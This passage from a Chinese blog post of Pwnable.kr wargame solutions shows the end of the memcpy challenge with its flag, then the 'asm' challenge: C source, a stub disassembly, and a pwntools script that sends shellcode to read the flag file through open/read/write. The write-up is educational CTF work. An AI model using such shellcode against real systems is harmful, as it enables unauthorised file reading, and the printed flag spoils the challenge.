ellapsed CPU cycles for slow_memcpy:1684<br />
ellapsed CPU cycles for fast_memcpy:166</p>
<p>experiment 7:memcpy with buffer size 520<br />
ellapsed CPU cycles for slow_memcpy:3700<br />
ellapsed CPU cycles for fast_memcpy:232</p>
<p>experiment 8:memcpy with buffer size 1032<br />
ellapsed CPU cycles for slow_memcpy:7130<br />
ellapsed CPU cycles for fast_memcpy:400</p>
<p>experiment 9:memcpy with buffer size 2056<br />
ellapsed CPU cycles for slow_memcpy:13596<br />
ellapsed CPU cycles for fast_memcpy:774</p>
<p>experiment 10:memcpy with buffer size 4104<br />
ellapsed CPU cycles for slow_memcpy:29864<br />
ellapsed CPU cycles for fast_memcpy:1486</p>
<p>thanks for helping my experiment!<br />
flag:1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</p>
<h2 id="asm"><a class="anchor" href="#asm">#</a> asm</h2>
<h3 id="é¢˜ç›®æè¿°-18"><a class="anchor" href="#é¢˜ç›®æè¿°-18">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;string.h&gt;<br />
#include &lt;stdlib.h&gt;<br />
#include &lt;sys/mman.h&gt;<br />
#include &lt;seccomp.h&gt;<br />
#include &lt;sys/prctl.h&gt;<br />
#include &lt;fcntl.h&gt;<br />
#include &lt;unistd.h&gt;</p>
<p>#define LENGTH 128</p>
<p>void sandbox(){<br />
scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);<br />
if (ctx == NULL) {<br />
printf(&quot;seccomp error\n&quot;);<br />
exit(0);<br />
}</p>
<pre><code>seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

if (seccomp_load(ctx) &lt; 0)&#123;
	seccomp_release(ctx);
	printf(&quot;seccomp error\n&quot;);
	exit(0);
&#125;
seccomp_release(ctx);
</code></pre>
<p>}</p>
<p>char stub[] = &quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;;<br />
unsigned char filter[256];<br />
int main(int argc, char* argv[]){</p>
<pre><code>setvbuf(stdout, 0, _IONBF, 0);
setvbuf(stdin, 0, _IOLBF, 0);

printf(&quot;Welcome to shellcoding practice challenge.\n&quot;);
printf(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n&quot;);
printf(&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n&quot;);
printf(&quot;If this does not challenge you. you should play 'asg' challenge :)\n&quot;);

char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
memset(sh, 0x90, 0x1000);
memcpy(sh, stub, strlen(stub));

int offset = sizeof(stub);
printf(&quot;give me your x64 shellcode: &quot;);
read(0, sh+offset, 1000);

alarm(10);
chroot(&quot;/home/asm_pwn&quot;);	// you are in chroot jail. so you can't use symlink in /tmp
sandbox();
((void (*)(void))sh)();
return 0;
</code></pre>
<p>}</p>
<h3 id="é¢˜ç›®è§£æ-18"><a class="anchor" href="#é¢˜ç›®è§£æ-18">#</a> é¢˜ç›®è§£æ</h3>
<p>é¦–å…ˆç¨‹åºåˆ†é…ä¸€å—å†…å­˜åŒºåŸŸï¼Œç„¶åç”¨ 0x90 å°†å…¶å¡«å……ï¼Œæ¥ç€å°† stub å¤åˆ¶è¿›å»ã€‚</p>
<p>å…¶ä¸­ stub çš„å†…å®¹åˆ©ç”¨ pwntools çš„ asm æ¨¡å—ç¿»è¯‘è¿‡æ¥å°±æ˜¯æ¸…ç©ºæ‰€æœ‰å¯„å­˜å™¨</p>
<blockquote>
<blockquote>
<blockquote>
<p>print disasm(&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;)<br />
0:   48                      dec    eax<br />
1:   31 c0                   xor    eax,eax<br />
3:   48                      dec    eax<br />
4:   31 db                   xor    ebx,ebx<br />
6:   48                      dec    eax<br />
7:   31 c9                   xor    ecx,ecx<br />
9:   48                      dec    eax<br />
a:   31 d2                   xor    edx,edx<br />
c:   48                      dec    eax<br />
d:   31 f6                   xor    esi,esi<br />
f:   48                      dec    eax<br />
10:   31 ff                   xor    edi,edi<br />
12:   48                      dec    eax<br />
13:   31 ed                   xor    ebp,ebp<br />
15:   4d                      dec    ebp<br />
16:   31 c0                   xor    eax,eax<br />
18:   4d                      dec    ebp<br />
19:   31 c9                   xor    ecx,ecx<br />
1b:   4d                      dec    ebp<br />
1c:   31 d2                   xor    edx,edx<br />
1e:   4d                      dec    ebp<br />
1f:   31 db                   xor    ebx,ebx<br />
21:   4d                      dec    ebp<br />
22:   31 e4                   xor    esp,esp<br />
24:   4d                      dec    ebp<br />
25:   31 ed                   xor    ebp,ebp<br />
27:   4d                      dec    ebp<br />
28:   31 f6                   xor    esi,esi<br />
2a:   4d                      dec    ebp<br />
2b:   31 ff                   xor    edi,edi</p>
</blockquote>
</blockquote>
</blockquote>
<p>æ¥ç€è¯»å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®åˆ°å†…å­˜ä¸­ã€‚</p>
<p>é‡ç‚¹åœ¨è¿™ä¸ªæ²™ç®±å‡½æ•°ï¼Œé€šè¿‡<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2VjY29tcA=="> seccomp</span> å»ºç«‹äº†ä¸€äº›è§„åˆ™ï¼Œé™åˆ¶äº†å¯ä»¥ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œåªèƒ½å¤Ÿä½¿ç”¨ <code>read</code> ã€ <code>open</code> ã€ <code>write</code> ã€ <code>exit</code> ã€ <code>exit_group</code> ã€‚</p>
<p>ä½†æœ‰è¿™å‡ ä¸ªå‡½æ•°å°±è¶³ä»¥æ„é€ å‡º shellcode å»è¯»å– flagï¼Œåˆ©ç”¨ pwntools çš„ shellcraft æ¨¡å—å’Œ asm æ¨¡å—å¾ˆè½»æ¾å°±å¯ä»¥å®Œæˆã€‚</p>
<p>æ±‡ç¼–è¯­è¨€å‡½æ•°è¿”å›å€¼ä¸€èˆ¬æ˜¯åœ¨ eax (rax) ä¸­ï¼Œæ‰€ä»¥ open ä¹‹å read çš„ fd å‚æ•°å¡« rax</p>
<p>from pwn import *</p>
<p>r=ssh('asm','<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>',2222,'guest')<br />
p=r.connect_remote('localhost',9026)<br />
context(arch='amd64', os='linux')</p>
<p>payload=&quot;&quot;<br />
payload=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')<br />
payload+=shellcraft.open('rsp',0,0)<br />
payload+=shellcraft.read('rax','rsp',100)<br />
payload+=shellcraft.write(1,'rsp',100)</p>
<p>print p.recvuntil('shellcode: ')</p>
<p>p.sendline(asm(payload))</p>
<p>print p.recvline()</p>
<p>åæ¥æµ‹è¯•äº†ä¸‹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ open æ‰“å¼€</p>
<p>payload+=shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')</p>

      <div class="tags">
          <a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i> CTF</a>
          <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"><i class="ic i-tag"></i> ç½‘ç»œå®‰å…¨</a>
          <a href="/tags/PWN/" rel="tag"><i class="ic i-tag"></i> PWN</a>
      </div>
  </div>

   <footer>

    <div class="meta">
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>æœ¬æ–‡ä½œè€…ï¼š </strong>a1oyss <i class="ic i-at"><em>@</em></i>a1oyss
  </li>
  <li class="link">
    <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
    <a href="https://a1oyss.github.io/2020/12/21012.html" title="Pwnableé¢˜è§£">https://a1oyss.github.io/2020/12/21012.html</a>
  </li>
  <li class="license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2020/12/5062.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;10&#x2F;13&#x2F;sVn5mvFbj1T3HO2.png" title="VScode+XDebugè¿œç¨‹è°ƒè¯•ThinkPHP RCE">
  <span class="type">ä¸Šä¸€ç¯‡</span>
  <span class="category"><i class="ic i-flag"></i> ç½‘ç»œå®‰å…¨</span>
  <h3>VScode+XDebugè¿œç¨‹è°ƒè¯•ThinkPHP RCE</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2021/03/8759.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;10&#x2F;13&#x2F;J5qtFM1iUxWlS9u.png" title="Hexoå›¾ç‰‡æ˜¾ç¤ºå¤±è´¥">
  <span class="type">ä¸‹ä¸€ç¯‡</span>
  <span class="category"><i class="ic i-flag"></i> æ‚è®°</span>
  <h3>Hexoå›¾ç‰‡æ˜¾ç¤ºå¤±è´¥</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#toddlers-bottle"><span class="toc-number">1.</span> <span class="toc-text"> Toddler&#39;s Bottle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fd"><span class="toc-number">1.1.</span> <span class="toc-text"> fd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#collision"><span class="toc-number">1.2.</span> <span class="toc-text"> collision</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">1.2.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-2"><span class="toc-number">1.2.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">1.3.</span> <span class="toc-text"> bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">1.3.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-3"><span class="toc-number">1.3.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.4.</span> <span class="toc-text"> flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">1.4.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-4"><span class="toc-number">1.4.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passcode"><span class="toc-number">1.5.</span> <span class="toc-text"> passcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5"><span class="toc-number">1.5.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-5"><span class="toc-number">1.5.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random"><span class="toc-number">1.6.</span> <span class="toc-text"> random</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6"><span class="toc-number">1.6.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-6"><span class="toc-number">1.6.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input2"><span class="toc-number">1.7.</span> <span class="toc-text"> input2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7"><span class="toc-number">1.7.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-7"><span class="toc-number">1.7.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-1-argv"><span class="toc-number">1.7.2.1.</span> <span class="toc-text"> stage 1 argv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-2-stdio"><span class="toc-number">1.7.2.2.</span> <span class="toc-text"> stage 2 stdio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-3-env"><span class="toc-number">1.7.2.3.</span> <span class="toc-text"> stage 3 env</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-4-file"><span class="toc-number">1.7.2.4.</span> <span class="toc-text"> stage 4 file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-5-network"><span class="toc-number">1.7.2.5.</span> <span class="toc-text"> stage 5 network</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-1-process"><span class="toc-number">2.</span> <span class="toc-text"> stage 1 process</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-2-stdio-2"><span class="toc-number">3.</span> <span class="toc-text"> stage 2 stdio</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-3-env-2"><span class="toc-number">4.</span> <span class="toc-text"> stage 3 env</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-4-file-2"><span class="toc-number">5.</span> <span class="toc-text"> stage 4 file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-5-network-2"><span class="toc-number">6.</span> <span class="toc-text"> stage 5 network</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#leg"><span class="toc-number">6.1.</span> <span class="toc-text"> leg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8"><span class="toc-number">6.1.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-8"><span class="toc-number">6.1.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mistake"><span class="toc-number">6.2.</span> <span class="toc-text"> mistake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9"><span class="toc-number">6.2.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-9"><span class="toc-number">6.2.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshock"><span class="toc-number">6.3.</span> <span class="toc-text"> shellshock</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-10"><span class="toc-number">6.3.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-10"><span class="toc-number">6.3.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.3.2.1.</span> <span class="toc-text"> å‚è€ƒæ–‡ç« </span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#coin1"><span class="toc-number">6.4.</span> <span class="toc-text"> coin1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-11"><span class="toc-number">6.4.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-11"><span class="toc-number">6.4.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blackjack"><span class="toc-number">6.5.</span> <span class="toc-text"> blackjack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-12"><span class="toc-number">6.5.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-12"><span class="toc-number">6.5.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lotto"><span class="toc-number">6.6.</span> <span class="toc-text"> lotto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-13"><span class="toc-number">6.6.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-13"><span class="toc-number">6.6.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd1"><span class="toc-number">6.7.</span> <span class="toc-text"> cmd1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-14"><span class="toc-number">6.7.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-14"><span class="toc-number">6.7.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd2"><span class="toc-number">6.8.</span> <span class="toc-text"> cmd2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-15"><span class="toc-number">6.8.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-15"><span class="toc-number">6.8.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uaf"><span class="toc-number">6.9.</span> <span class="toc-text"> uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-16"><span class="toc-number">6.9.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-16"><span class="toc-number">6.9.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">6.10.</span> <span class="toc-text"> memcpy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-17"><span class="toc-number">6.10.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-17"><span class="toc-number">6.10.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpyprowl~-nc-0-9022hey-i-have-a-boring-assignment-for-cs-class-the-assignment-is-simple"><span class="toc-number">6.11.</span> <span class="toc-text"> memcpy@prowl:~$ nc 0 9022
Hey, I have a boring assignment for CS class.. ğŸ˜¦
The assignment is simple.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asm"><span class="toc-number">6.12.</span> <span class="toc-text"> asm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-18"><span class="toc-number">6.12.1.</span> <span class="toc-text"> é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-18"><span class="toc-number">6.12.2.</span> <span class="toc-text"> é¢˜ç›®è§£æ</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« ">
        <ul>
          <li><a href="/2020/10/7981.html" rel="bookmark" title="ISCCä¸€æ—¥æ¸¸">ISCCä¸€æ—¥æ¸¸</a></li><li><a href="/2020/11/38798.html" rel="bookmark" title="é¦–å±ŠBilibiliå®‰å…¨æŒ‘æˆ˜èµ›">é¦–å±ŠBilibiliå®‰å…¨æŒ‘æˆ˜èµ›</a></li><li><a href="/2020/12/5062.html" rel="bookmark" title="VScode+XDebugè¿œç¨‹è°ƒè¯•ThinkPHP RCE">VScode+XDebugè¿œç¨‹è°ƒè¯•ThinkPHP RCE</a></li><li class="active"><a href="/2020/12/21012.html" rel="bookmark" title="Pwnableé¢˜è§£">Pwnableé¢˜è§£</a></li><li><a href="/2022/09/13394.html" rel="bookmark" title="CTFd+CTFd-Whaleéƒ¨ç½²å®è·µ">CTFd+CTFd-Whaleéƒ¨ç½²å®è·µ</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="a1oyss"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">a1oyss</p>
  <div class="description" itemprop="description">éšä¾¿å†™ç‚¹ä»€ä¹ˆ</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">22</span>
        <span class="name">æ–‡ç« </span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">åˆ†ç±»</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">19</span>
        <span class="name">æ ‡ç­¾</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Exb3lzcw==" title="https:&#x2F;&#x2F;github.com&#x2F;a1oyss"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a>
  </li>

    
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a>
  </li>

    
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2020/12/5062.html" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2021/03/8759.html" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>éšæœºæ–‡ç« </h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="åˆ†ç±»äº ç½‘ç»œå®‰å…¨">ç½‘ç»œå®‰å…¨</a>
</div>

    <span><a href="/2020/12/5062.html" title="VScode+XDebugè¿œç¨‹è°ƒè¯•ThinkPHP RCE">VScode+XDebugè¿œç¨‹è°ƒè¯•ThinkPHP RCE</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/" title="åˆ†ç±»äº åç«¯å¼€å‘">åç«¯å¼€å‘</a>
<i class="ic i-angle-right"></i>
<a href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/Redis/" title="åˆ†ç±»äº Redis">Redis</a>
</div>

    <span><a href="/2024/10/813972997.html" title="Redisæºç å­¦ä¹ -intset">Redisæºç å­¦ä¹ -intset</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%9D%82%E8%AE%B0/" title="åˆ†ç±»äº æ‚è®°">æ‚è®°</a>
</div>

    <span><a href="/2021/03/8759.html" title="Hexoå›¾ç‰‡æ˜¾ç¤ºå¤±è´¥">Hexoå›¾ç‰‡æ˜¾ç¤ºå¤±è´¥</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%9D%82%E8%AE%B0/" title="åˆ†ç±»äº æ‚è®°">æ‚è®°</a>
</div>

    <span><a href="/2022/05/11560.html" title="Terminalå®‰è£…+ç¾åŒ–">Terminalå®‰è£…+ç¾åŒ–</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/" title="åˆ†ç±»äº åç«¯å¼€å‘">åç«¯å¼€å‘</a>
<i class="ic i-angle-right"></i>
<a href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/Redis/" title="åˆ†ç±»äº Redis">Redis</a>
</div>

    <span><a href="/2024/10/2040406187.html" title="Redisæºç å­¦ä¹ -Skiplist">Redisæºç å­¦ä¹ -Skiplist</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/" title="åˆ†ç±»äº åç«¯å¼€å‘">åç«¯å¼€å‘</a>
<i class="ic i-angle-right"></i>
